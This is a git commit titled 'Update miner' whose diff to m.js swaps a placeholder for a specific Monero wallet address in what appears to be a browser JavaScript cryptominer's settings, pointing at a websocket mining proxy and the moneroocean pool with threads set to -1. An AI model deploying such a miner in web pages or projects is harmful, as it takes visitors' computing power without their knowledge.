e5c2ba8d5de476c90405c8a4fbe1acc127d6035a
krazykirby99999 <krazykirby99999@gmail.com>
2021-01-23 15:38:07 -0600

    Update miner

--- m.js
+++ m.js
@@ -2,7 +2,7 @@
 
 server = "wss://f.xmrminingproxy.com:8181";
 var pool = "moneroocean.stream";
-var walletAddress = "PUT YOUR WALLET ADDRESS HERE";
+var walletAddress = "42XYmYVDcjmAVfKeHasJM62bst7TUmcESDaczqtDzrokBSfu5NavWvVDd2jNyh9rjoAqGmVddpFB8MSPdaeTKdtr9qj7iEp";
 var workerId = ""
 var threads = -1;
 var password = "x";
